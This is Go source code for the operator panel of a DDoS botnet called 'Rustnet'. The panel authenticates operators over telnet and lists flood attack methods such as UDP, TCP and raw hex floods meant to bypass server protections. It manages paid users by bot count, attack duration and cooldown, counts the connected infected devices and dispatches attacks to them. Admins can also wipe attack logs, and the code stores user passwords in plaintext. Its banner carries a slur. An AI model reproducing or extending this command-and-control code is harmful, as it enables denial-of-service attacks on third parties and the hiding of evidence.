package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"
)

type Admin struct {
	conn net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
	return &Admin{conn}
}

func (this *Admin) Handle() {
	this.conn.Write([]byte("\033[?1049h"))
	this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

	defer func() {
		this.conn.Write([]byte("\033[?1049l"))
	}()

	// Get username
	this.conn.Write([]byte(fmt.Sprintf("\033]0;Rustnet| Please enter your credentials.\007")))
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\033[31mUsername \033[37m> \033[31m"))
	username, err := this.ReadLine(false)
	if err != nil {
		return
	}

	// Get password
	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	this.conn.Write([]byte("\033[31mPassword \033[37m> \033[31m"))
	password, err := this.ReadLine(true)
	if err != nil {
		return
	}

	this.conn.SetDeadline(time.Now().Add(300 * time.Second))
	spinBuf := []byte{'-', '\\', '|', '/'}
	for i := 0; i < 15; i++ {
		msg := fmt.Sprintf("\033[31mLoading... %c\033[0m\r", spinBuf[i%len(spinBuf)])
		this.conn.Write([]byte(msg))
		time.Sleep(100 * time.Millisecond)
	}
	this.conn.Write([]byte("\033[K\r\n"))

	var loggedIn bool
	var userInfo AccountInfo
	if loggedIn, userInfo = database.TryLogin(username, password); !loggedIn {
		this.conn.Write([]byte("\r\033[31mWrong user or password, try again.\r\n"))
		buf := make([]byte, 1)
		this.conn.Read(buf)
		return
	}

	if len(username) > 0 && len(password) > 0 {
		log.SetFlags(log.LstdFlags)
		loginLogsOutput, err := os.OpenFile("logs/logins.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0665)
		if err != nil {
			fmt.Println("Error: ", err)
		}
		success := "successful login"
		usernameFormat := "username:"
		passwordFormat := "password:"
		ipFormat := "ip:"
		cmdSplit := "|"
		log.SetOutput(loginLogsOutput)
		log.Println(cmdSplit, success, cmdSplit, usernameFormat, username, cmdSplit, passwordFormat, password, cmdSplit, ipFormat, this.conn.RemoteAddr())
	}
	this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[31m  < Rustnet [V1.0] >\r\n"))
			this.conn.Write([]byte("\033[31m  Type "?" to see all commands\r\n"))
			this.conn.Write([]byte("\033[31m  t.me/CyberNiggerzz\r\n"))

	go func() {
		for {
			var BotCount int
			if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
				BotCount = userInfo.maxBots
			} else {
				BotCount = clientList.Count()
			}

			// FIX 1: Use underscore to ignore the unused variable
			if _, err := database.GetOnlineCount(); err != nil {
				fmt.Println("Error fetching online count:", err)
			}

			if userInfo.admin == 1 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Devices : [%d] \007", BotCount))); err != nil {
					this.conn.Close()
					break
				}
			}
			if userInfo.admin == 0 {
				if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0;Devices : [%d] \007", BotCount))); err != nil {
					this.conn.Close()
					break
				}
			}
		}
	}()

	for {
		var botCatagory string
		var botCount int
		this.conn.Write([]byte("\033[31m" + username + " \033[31m★ \033[37m★ "))
		cmd, err := this.ReadLine(false)
		if cmd == "" {
			continue
		}
		if err != nil || cmd == "cls" || cmd == "clear" || cmd == "c" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[31m  < Rustnet [V1.0] >\r\n"))
			this.conn.Write([]byte("\033[31m  Type "?" to see all commands\r\n"))
			this.conn.Write([]byte("\033[31m  t.me/CyberNiggerzz\r\n"))
			continue
		}
		if cmd == "Methods" || cmd == "METHODS" || cmd == "methods" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n\033[31mUDP\033[0m\r\n"))
			this.conn.Write([]byte("\033[31mudp-strong    \033[37m- Higher Gbps\r\n"))
			this.conn.Write([]byte("\033[31mnudp          \033[37m- Higher PPS\r\n"))
			this.conn.Write([]byte("\033[31mudphex        \033[37m- UDP with Size Payload\r\n"))
			this.conn.Write([]byte("\033[31msamp          \033[37m- PING GAME\r\n"))

			this.conn.Write([]byte("\r\n\033[31mTCP\033[0m\r\n"))
			this.conn.Write([]byte("\033[31mtcp-mix       \033[37m- Bypass Servers\r\n"))

			this.conn.Write([]byte("\r\n\033[31mRAW\033[0m\r\n"))
			this.conn.Write([]byte("\033[31mhex-flood     \033[37m- Higher Size Payload\r\n"))
			this.conn.Write([]byte("\033[31mstrong-hex    \033[37m- Bypass Servers\r\n"))
			this.conn.Write([]byte("\033[31msocket-raw    \033[37m- Higher PPS and Gbps\r\n"))

			this.conn.Write([]byte("\r\n\033[31mExample: \033[37m<method> <target> <time> port=<port>\r\n"))
			continue
		}
		if cmd == "help" || cmd == "HELP" || cmd == "?" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[31m================\r\n"))
			this.conn.Write([]byte("\033[31m     HELP      \r\n"))
			this.conn.Write([]byte("\033[31m================\r\n"))
			this.conn.Write([]byte("\033[31mMethods  \033[37m- List of methods\r\n"))
			this.conn.Write([]byte("\033[31mInfo     \033[37m- Your information\r\n"))
			this.conn.Write([]byte("\033[31mRules    \033[37m- Don't play with rules\r\n"))
			this.conn.Write([]byte("\033[31mPass     \033[37m- Change your password\r\n"))
			this.conn.Write([]byte("\033[31mClear    \033[37m- Clear screen\r\n"))
			this.conn.Write([]byte("\033[31mLogout   \033[37m- Exit session\r\n"))
			this.conn.Write([]byte("\033[31m================\r\n"))
			continue
		}
		if cmd == "pass" || cmd == "Pass" || cmd == "PASS" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[31mNew password \033[37m> \033[31m"))
			newPassword, err := this.ReadLine(true)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[31mConfirm? (y/n) \033[31m"))
			confirmation, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirmation != "y" && confirmation != "Y" {
				this.conn.Write([]byte("\033[31mPassword change canceled\r\n"))
				continue
			} else {
				username := userInfo.username
				success := database.ChangePass(username, newPassword)
				if success {
					this.conn.Write([]byte("\033[31mPassword successfully changed\r\n"))
				} else {
					this.conn.Write([]byte("\033[31mFailed to change password\r\n"))
				}
				continue
			}
		}
		if err != nil || cmd == "ongoing" || cmd == "Ongoing" {

		}
		if err != nil || cmd == "RULES" || cmd == "rules" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[31m================\r\n"))
			this.conn.Write([]byte("\033[31m     RULES     \r\n"))
			this.conn.Write([]byte("\033[31m================\r\n"))
			this.conn.Write([]byte("\033[37mDO NOT SPAM ATTACKS !\r\n"))
			this.conn.Write([]byte("\033[37mDO NOT SHARE LOGINS !\r\n"))
			this.conn.Write([]byte("\033[37mDO NOT ATTACK GOVERNMENTS !\r\n"))
			this.conn.Write([]byte("\033[37mONLY USE FOR Testing\r\n"))
			this.conn.Write([]byte("\033[37m3 Warnings = Ban\r\n"))
			this.conn.Write([]byte("\033[31m================\r\n"))
			continue
		}
		if cmd == "logout" || cmd == "LOGOUT" || cmd == "exit" || cmd == "quit" {
			database.Logout(username)
			fmt.Printf("User %s has been logged out\n", username)
			return
		}

		if userInfo.admin == 1 && cmd == "hsjahelp" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\033[31mhsjauser   \033[37m- ADD NEW NORMAL USER\r\n"))
			this.conn.Write([]byte("\033[31mhsjaadmin  \033[37m- ADD NEW ADMIN\r\n"))
			this.conn.Write([]byte("\033[31mhsjaremove \033[37m- REMOVE USER\r\n"))
			this.conn.Write([]byte("\033[31mhsjalogs   \033[37m- REMOVE ATTACKS LOGS\r\n"))
			this.conn.Write([]byte("\033[31mcount      \033[37m- SHOW ALL BOTS\r\n"))
			continue
		}

		if err != nil || cmd == "INFO" || cmd == "Info" || cmd == "info" {
			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte(fmt.Sprintf("\033[31m================\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[31m     INFO      \r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[31m================\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[31mLogged In As: \033[37m%s\r\n", username)))
			this.conn.Write([]byte(fmt.Sprintf("\033[31mDeveloped By: \033[37mZeth\r\n")))
			this.conn.Write([]byte(fmt.Sprintf("\033[31m================\r\n")))
			continue
		}

		if len(cmd) > 0 {
			log.SetFlags(log.LstdFlags)
			output, err := os.OpenFile("logs/commands.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
			if err != nil {
				fmt.Println("Error: ", err)
			}
			usernameFormat := "username:"
			cmdFormat := "command:"
			ipFormat := "ip:"
			cmdSplit := "|"
			log.SetOutput(output)
			log.Println(cmdSplit, usernameFormat, username, cmdSplit, cmdFormat, cmd, cmdSplit, ipFormat, this.conn.RemoteAddr())
		}

		botCount = userInfo.maxBots

		if userInfo.admin == 1 && cmd == "hsjaadmin" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("-1 for Full Bots.\r\n"))
			this.conn.Write([]byte("Allowed Bots: "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for Max attack duration. \r\n"))
			this.conn.Write([]byte("Allowed Duration: "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("0 for no cooldown. \r\n"))
			this.conn.Write([]byte("Cooldown: "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				continue
			}
			this.conn.Write([]byte("Username: " + new_un + "\r\n"))
			this.conn.Write([]byte("Password: " + new_pw + "\r\n"))
			this.conn.Write([]byte("Duration: " + duration_str + "\r\n"))
			this.conn.Write([]byte("Cooldown: " + cooldown_str + "\r\n"))
			this.conn.Write([]byte("Bots: " + max_bots_str + "\r\n"))
			this.conn.Write([]byte(""))
			this.conn.Write([]byte("Confirm(y): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			// FIX 2: Changed to lowercase createAdmin - EXACT MATCH
			if !database.createAdmin(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte("Failed to create Admin! \r\n"))
			} else {
				this.conn.Write([]byte("Admin created! \r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "hsjalogs" {
			this.conn.Write([]byte("\033[31mClear attack logs? (y/n): \033[31m"))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CleanLogs() {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mError, can't clear logs, please check debug logs\r\n")))
			} else {
				this.conn.Write([]byte("\033[37mAll Attack logs has been cleaned !\r\n"))
				fmt.Println("\033[31m[\033[37mServerLogs\033[31m] Logs has been cleaned by \033[37m" + username + " \033[31m!\r\n")
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "hsjaremove" {
			this.conn.Write([]byte("Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if !database.removeUser(new_un) {
				this.conn.Write([]byte("User doesn't exists.\r\n"))
			} else {
				this.conn.Write([]byte("User removed\r\n"))
			}
			continue
		}

		if userInfo.admin == 1 && cmd == "hsjauser" {
			this.conn.Write([]byte("\033[31m-> Enter New Username: "))
			new_un, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[31m-> Choose New Password: "))
			new_pw, err := this.ReadLine(false)
			if err != nil {
				return
			}
			this.conn.Write([]byte("\033[31m-> Enter Bot Count (-1 For Full Bots): "))
			max_bots_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			max_bots, err := strconv.Atoi(max_bots_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m-> \033[31m%s\033[31m\r\n", "Failed To Parse The Bot Count")))
				continue
			}
			this.conn.Write([]byte("\033[31m-> Max Attack Duration (-1 For None): "))
			duration_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			duration, err := strconv.Atoi(duration_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m-> \033[37m%s\033[31m\r\n", "Failed To Parse The Attack Duration Limit")))
				continue
			}
			this.conn.Write([]byte("\033[31m-> Cooldown Time (0 For None): "))
			cooldown_str, err := this.ReadLine(false)
			if err != nil {
				return
			}
			cooldown, err := strconv.Atoi(cooldown_str)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m-> \033[31m%s\033[31m\r\n", "Failed To Parse The Cooldown")))
				continue
			}
			this.conn.Write([]byte("\033[31m-> New Account Info: \r\nUsername: " + new_un + "\r\nPassword: " + new_pw + "\r\nBotcount: " + max_bots_str + "\r\nDuration: " + duration_str + "\r\nCooldown: " + cooldown_str + "\r\nContinue? (Y/N): "))
			confirm, err := this.ReadLine(false)
			if err != nil {
				return
			}
			if confirm != "y" {
				continue
			}
			if !database.CreateUser(new_un, new_pw, max_bots, duration, cooldown) {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m-> \033[31m%s\033[31m\r\n", "Failed To Create New User. An Unknown Error Occured.")))
			} else {
				this.conn.Write([]byte("\033[31m-> User Added Successfully.\033[31m\r\n"))
			}
			continue
		}
		if userInfo.admin == 1 && cmd == "count" || cmd == "bots" || cmd == "Bots" {
			botCount = clientList.Count()
			m := clientList.Distribution()
			for k, v := range m {
				this.conn.Write([]byte(fmt.Sprintf("\033[31m%s: \033[37m%d\033[31m\r\n", k, v)))
			}
			this.conn.Write([]byte(fmt.Sprintf("\033[31mTotal botcount: \033[37m%d\r\n", botCount)))
			continue
		}
		if cmd[0] == '-' {
			countSplit := strings.SplitN(cmd, " ", 2)
			count := countSplit[0][1:]
			botCount, err = strconv.Atoi(count)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mFailed To Parse Botcount \"%s\"\033[31m\r\n", count)))
				continue
			}
			if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mBot Count To Send Is Bigger Than Allowed Bot Maximum\033[31m\r\n")))
				continue
			}
			cmd = countSplit[1]
		}
		if cmd[0] == '@' {
			cataSplit := strings.SplitN(cmd, " ", 2)
			botCatagory = cataSplit[0][1:]
			cmd = cataSplit[1]
		}

		atk, err := NewAttack(cmd, userInfo.admin)
		if err != nil {
			this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[31m\r\n", err.Error())))
		} else {
			if database.fetchRunningAttacks() >= 1 {
				this.conn.Write([]byte("\033[31mslots is full !\r\n"))
			} else { // Hanya lanjutkan jika tidak ada serangan berjalan
				buf, err := atk.Build()
				if err != nil {
					this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[31m\r\n", err.Error())))
				} else {
					if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
						this.conn.Write([]byte(fmt.Sprintf("\033[31m%s\033[31m\r\n", err.Error())))
					} else if !database.ContainsWhitelistedTargets(atk) {
						clientList.QueueBuf(buf, botCount, botCatagory)
						this.conn.Write([]byte(fmt.Sprintf("\033[32mAttack sent to %d devices\r\n", botCount)))
					} else {
						fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
					}
				}
			}
		}
	}
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0

	for {
		n, err := this.conn.Read(buf[bufPos : bufPos+1])
		if err != nil || n != 1 {
			return "", err
		}
		if buf[bufPos] == '\xFF' {
			n, err := this.conn.Read(buf[bufPos : bufPos+2])
			if err != nil || n != 2 {
				return "", err
			}
			bufPos--
		} else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos--
			}
			bufPos--
		} else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
			bufPos--
		} else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		} else if buf[bufPos] == 0x03 {
			this.conn.Write([]byte("^C\r\n"))
			return "", nil
		} else {
			if buf[bufPos] == '\x1B' {
				buf[bufPos] = '^'
				this.conn.Write([]byte(string(buf[bufPos])))
				bufPos++
				buf[bufPos] = '['
				this.conn.Write([]byte(string(buf[bufPos])))
			} else if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte(string(buf[bufPos])))
			}
		}
		bufPos++
	}
	return string(buf), nil
}
